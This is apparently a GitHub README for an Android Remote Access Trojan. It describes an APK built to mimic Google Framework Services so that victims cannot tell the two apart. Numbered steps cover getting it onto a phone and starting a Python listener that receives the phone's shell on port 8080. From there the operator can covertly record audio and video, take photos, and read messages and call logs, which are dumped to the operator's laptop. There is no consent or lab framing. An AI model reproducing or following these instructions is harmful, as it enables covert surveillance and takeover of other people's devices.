# Android-Remote-Access-Trojan

This is a Remote Access Trojan (RAT) created for Android operating system.

It consists of an android application (.apk) file called Neelapp.apk which is a vulnerable application. It has certain exploits which can be used to penetrate the security of Android devices. Once the app is loaded in the android device, it can be used to perform a various number of actions within the mobile like accessing the camera, recording video, recording audio, accessing the messages inbox and outbox, call logs etc. Moreover with just a click it can access the shell of the complete system through which various independent commands can be run to hack into the kernel of the operating system.

----------------------------------------------------------------------------------------------------------------------------------------------------------

Instructions to use the project in your local computer

1. Clone this repository to your local computer
2. From the contents of the file, you can find a application file named "Neelapp.apk"
3. The apk file is a vulnerable one and built using the mirror image of Google Framework Services. One cannot distinguish between the two once it is installed into their smart phones.
4. Next open the Remote Access Trojan folder to find a file named "Abhraneel.neelapk.ovpn" which is a Open Virtual Private Network file used to transfer the file from the laptop into any mobile through a secure connection.
5. You need to transfer the file into a respective smart Android phone.
6. Once the file is transfer, you need to Install the application into your smart phone.
7. Once the installation is complete, you need to open Command Prompt or Terminal in our laptop and type in the command python androRAT.py --shell -i 0.0.0.0 -p 8080.
8. This command is used to start the AndroRAT installed in your system with the help of python dependencies. The shell of the android OS gets connected to the port 8080 of the laptop and within few seconds you should get the respective connection from the mobile ip.
   ![5](https://github.com/the-neelguy/Android-Remote-Access-Trojan/assets/77458394/1178270c-78e1-4107-9046-0c35f43642f6)
9. Once the connection is established, you will get a screen like the below image where can perform any task based on the commands provided in the list
   ![1](https://github.com/the-neelguy/Android-Remote-Access-Trojan/assets/77458394/fac5fe48-48ec-4417-822f-6988687e3d42)
10. All your recordings, pictures, call logs etc will be stored in the Dumps folder inside AndroRAT.

It is recommended to delete the application from the mobile once the activity is completed.

Thanks for using my project! You are welcome to contribute into my project.
